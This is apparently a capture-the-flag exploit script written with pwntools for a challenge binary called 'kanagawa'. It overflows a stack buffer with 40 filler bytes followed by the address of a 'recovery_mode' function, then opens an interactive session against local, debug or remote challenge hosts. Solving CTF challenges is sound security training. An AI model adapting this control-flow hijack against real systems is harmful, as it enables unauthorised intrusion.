#!/usr/bin/env python
"""Exploit script template."""
import subprocess
import sys

from pwn import *

context.log_level = 'info'

BINARY = './kanagawa'
LIB = ''
HOST = 'challs.dvc.tf'
PORT = 4444

GDB_COMMANDS = ['b main']



def exploit(p, mode, libc):
    """Exploit goes here."""

    payload = 40*b'A' + p32(context.binary.sym['recovery_mode'])

    p.sendlineafter('Email:', payload)
    p.sendlineafter('Message:', 'A'*5)

    p.interactive()


def main():
    """Does general setup and calls exploit."""
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <mode>')
        sys.exit(0)

    try:
        context.binary = ELF(BINARY)
    except IOError:
        print(f'Failed to load binary ({BINARY})')

    libc = None
    try:
        libc = ELF(LIB)
        env = os.environ.copy()
        env['LD_PRELOAD'] = LIB
    except IOError:
        print(f'Failed to load library ({LIB})')

    mode = sys.argv[1]

    if mode == 'local':
        p = remote('pwn.local', 2222)
    elif mode == 'debug':
        p = remote('pwn.local', 2223)
        gdb_cmd = [
            'tmux',
            'split-window',
            '-p',
            '75',
            'gdb',
            '-ex',
            'target remote pwn.local:2224',
        ]

        for cmd in GDB_COMMANDS:
            gdb_cmd.append('-ex')
            gdb_cmd.append(cmd)

        gdb_cmd.append(BINARY)

        subprocess.Popen(gdb_cmd)

    elif mode == 'remote':
        p = remote(HOST, PORT)
    else:
        print('Invalid mode')
        sys.exit(1)

    exploit(p, mode, libc)

if __name__ == '__main__':

    main()
